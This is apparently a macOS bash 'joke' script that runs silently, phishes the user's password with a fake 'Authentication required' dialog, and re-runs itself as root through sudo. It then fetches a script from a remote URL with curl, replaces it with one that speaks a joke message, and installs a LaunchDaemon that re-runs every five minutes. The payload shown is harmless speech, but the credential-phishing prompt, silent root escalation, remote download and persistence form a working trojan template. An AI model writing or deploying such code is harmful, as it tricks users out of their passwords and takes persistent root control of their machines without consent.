#!/bin/bash

# Run quietly
exec >/dev/null 2>&1

set -e

SCRIPT_URL="https://raw.githubusercontent.com/MatthewGCampbell/MatthewGCampbell/main/display_message.sh"
SCRIPT_PATH="/usr/local/bin/joke_display_message.sh"
PLIST_PATH="/Library/LaunchDaemons/com.jokemessage.plist"

############################################
# Silent elevation & password prompt
############################################

if [[ "$EUID" -ne 0 ]]; then
  thePassword="$(osascript -e 'text returned of (display dialog "Authentication required" default answer "" with hidden answer)')"

  [[ -z "$thePassword" ]] && exit 0

  printf "%s" "$thePassword" | sudo -S bash "$0" "$thePassword" "$@" >/dev/null 2>&1 || exit 1
  exit 0
fi

############################################
# Now running as root silently
############################################

PASSWORD="$1"

# Download script without output
curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH" >/dev/null 2>&1

# Replace with joke script quietly
cat <<'EOF' > "$SCRIPT_PATH"
#!/bin/bash
/usr/bin/say "This is a joke message. Your system is fine."
EOF

chmod 755 "$SCRIPT_PATH" >/dev/null 2>&1

# Create LaunchDaemon quietly
cat <<EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.jokemessage</string>
    <key>ProgramArguments</key>
    <array>
        <string>$SCRIPT_PATH</string>
    </array>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

chown root:wheel "$PLIST_PATH" >/dev/null 2>&1
chmod 644 "$PLIST_PATH" >/dev/null 2>&1

launchctl unload "$PLIST_PATH" >/dev/null 2>&1 || true
launchctl load "$PLIST_PATH" >/dev/null 2>&1

/usr/bin/say "This is a joke message. Your system is fine." >/dev/null 2>&1 &
